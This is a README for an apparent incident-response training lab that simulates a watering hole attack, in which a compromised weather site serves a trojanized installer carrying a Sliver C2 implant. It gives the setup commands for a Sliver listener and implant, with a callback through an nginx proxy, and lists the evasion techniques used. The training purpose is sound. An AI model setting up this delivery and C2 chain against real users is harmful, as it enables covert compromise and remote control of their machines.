# Watering Hole Attack

Watering hole attack training scenario where a compromised weather website delivers Sliver C2 implants to Windows clients via a trojanized installer download.

## Overview

Students operate as incident responders investigating suspicious network traffic from a Windows workstation. The attack infrastructure uses a dual-homed weather server to proxy C2 callbacks to a hidden Sliver server on a separate subnet.

## Attack Flow

```
Browse weather site → Click "AtmosVision Pro" ad → Download installer → Implant executes → C2 callback via /api/news/
```

1. **Setup** - White Cell starts Sliver listener and generates a Windows implant
2. **Delivery** - Victim browses to weather site, clicks ad, downloads trojanized installer
3. **Execution** - Installer runs cover app + Sliver implant with evasion techniques
4. **C2 Callback** - Implant phones home via nginx proxy to hidden C2 server

## Network Architecture

```
        ┌─────────────────────────────────────┐
        │       user-net (10.10.1.0/24)        │
        │                                       │
        │  ┌──────────┐    ┌─────────────────┐ │
        │  │ win11    │    │ weather-server  │ │
        │  │ .10      │───▶│ .20 (nginx)     │ │
        │  │ (victim) │    │                 │ │
        │  └──────────┘    └────────┬────────┘ │
        └───────────────────────────┼──────────┘
                                    │ dual-homed
        ┌───────────────────────────┼──────────┐
        │       c2-net (10.10.2.0/24)│          │
        │                           │          │
        │              ┌────────────┴────────┐ │
        │              │ weather-server      │ │
        │              │ .20 (proxy → C2)    │ │
        │              └─────────────────────┘ │
        │                                      │
        │              ┌─────────────────────┐ │
        │              │ c2-server           │ │
        │              │ .30 (sliver)        │ │
        │              └─────────────────────┘ │
        └──────────────────────────────────────┘
```

| Network | Subnet | Purpose |
|---------|--------|---------|
| user-net | 10.10.1.0/24 | Victim network (Windows client + weather frontend) |
| c2-net | 10.10.2.0/24 | Hidden C2 network (weather proxy + Sliver) |

## VMs

| Hostname | Image | Network | Role |
|----------|-------|---------|------|
| win11-client | dockurr/windows:11 | user-net | Windows 11 victim |
| weather-server | cyroid/wh-weather-server | user-net + c2-net | Nginx + weather frontend (dual-homed) |
| c2-server | cyroid/wh-c2-server | c2-net | Sliver C2 server |

## Required Images

- `cyroid/wh-weather-server` (from catalog: `images/wh-weather-server`)
- `cyroid/wh-c2-server` (from catalog: `images/wh-c2-server`)
- `dockurr/windows:11` (public - Windows 11 VM via dockur)

## White Cell Quick Start

1. SSH into c2-server (10.10.2.30)
2. Start Sliver: `sliver-server`
3. Start listener: `http --lport 8080 --lhost 0.0.0.0`
4. Generate implant: `generate --http http://10.10.1.20/api/news/ --os windows --arch amd64 --save /home/sliver/builds`
5. Direct victim to browse `http://10.10.1.20` → Explore → click "AtmosVision Pro"

## Key Techniques (MITRE ATT&CK)

| Technique | ID | Description |
|-----------|----|-------------|
| Drive-by Compromise | T1189 | Victim visits compromised website |
| User Execution | T1204 | Victim runs downloaded installer |
| Obfuscated Files | T1027 | XOR-encoded implant binary |
| Proxy: Multi-hop | T1090.003 | C2 traffic proxied through nginx |
| Masquerading | T1036 | Implant disguised as legitimate app |

## Difficulty

Intermediate - suitable for incident response training and C2 infrastructure analysis.

## Tags

`watering-hole`, `c2`, `sliver`, `incident-response`, `training`
